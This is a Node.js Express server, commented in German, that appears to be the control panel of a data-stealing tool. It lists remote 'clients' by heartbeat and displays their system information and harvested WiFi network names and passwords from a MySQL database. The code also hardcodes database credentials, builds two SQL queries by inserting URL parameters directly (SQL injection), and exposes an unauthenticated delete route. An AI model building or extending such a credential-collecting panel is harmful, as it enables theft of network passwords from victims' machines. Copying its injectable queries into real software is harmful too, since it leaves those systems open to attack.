const express = require('express');
const mysql = require('mysql');
const path = require('path');
const https = require('https');
const fs = require('fs');

// SSL-Zertifikat laden (selbstsigniert)
const sslOptions = {
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.cert')
};

const app = express();

// MySQL-Datenbankverbindung
const db = mysql.createConnection({
  host: '192.168.1.71',
  user: 'ShadowByte',
  password: 'ShadowByte',
  database: 'system_info_db',
  timezone: '+02:00' // Hier wird die Zeitzone auf +2 gesetzt
});

db.connect((err) => {
    if (err) throw err;
    console.log('Connected to database');
});

// Setze den Ordner für statische Dateien (CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// EJS als Template-Engine einstellen
app.set('view engine', 'ejs');

// Funktion zur Aktualisierung des Online-Status basierend auf dem letzten Online-Zeitpunkt
function updateClientStatus(callback) {
  // Überprüfe, ob der Client in den letzten 10 Sekunden aktiv war
  let sql = `
    UPDATE clients
    SET online_status = 0
    WHERE TIMESTAMPDIFF(SECOND, last_online, NOW()) > 10;
  `;

  db.query(sql, (err, result) => {
    if (err) throw err;
    callback();
  });
}

// Route zum Löschen eines Clients
app.get('/delete-client/:client_id', (req, res) => {
  const clientId = req.params.client_id;

  // Lösche den Client und alle zugehörigen Informationen (Cascading Delete)
  let sql = `DELETE FROM clients WHERE id = ?`;
  
  db.query(sql, [clientId], (err, result) => {
    if (err) throw err;
    console.log(`Client mit der ID ${clientId} erfolgreich gelöscht`);
    res.redirect('/'); // Zur Hauptübersicht zurückkehren
  });
});

// Startseite: Liste aller Clients anzeigen
app.get('/', (req, res) => {
  // Zuerst den Status der Clients basierend auf ihrem letzten Online-Zeitpunkt aktualisieren
  updateClientStatus(() => {
    // Dann die Liste aller Clients abrufen und rendern
    let sql = 'SELECT * FROM clients';
    db.query(sql, (err, result) => {
      if (err) throw err;
      res.render('index', { clients: result });
    });
  });
});

// Detailansicht: Informationen zu einem bestimmten Client anzeigen
app.get('/client/:client_id', (req, res) => {
  let sql = `SELECT * FROM system_info WHERE client_id = ${req.params.client_id}`;
  db.query(sql, (err, result) => {
    if (err) throw err;
    console.log(result[0]); // Prüfe, ob alle Daten richtig geladen werden
    res.render('client_details', { clientInfo: result[0] });
  });
});

// Route to fetch WiFi information for a specific client and display the hostname
app.get('/client/:client_id/wifi', (req, res) => {
  let sql = `SELECT wifi_info.ssid, wifi_info.password, clients.hostname 
             FROM wifi_info 
             JOIN clients ON wifi_info.client_id = clients.id 
             WHERE wifi_info.client_id = ${req.params.client_id}`;
  
  db.query(sql, (err, result) => {
    if (err) throw err;
    
    // If WiFi info is found, pass it and the hostname to the view
    const hostname = result.length > 0 ? result[0].hostname : 'Unbekannt';
    res.render('wifi_details', { wifiInfo: result, clientHostname: hostname });
  });
});

// HTTPS Server starten
https.createServer(sslOptions, app).listen(3000, () => {
  console.log('Server läuft auf https://localhost:3000');
});
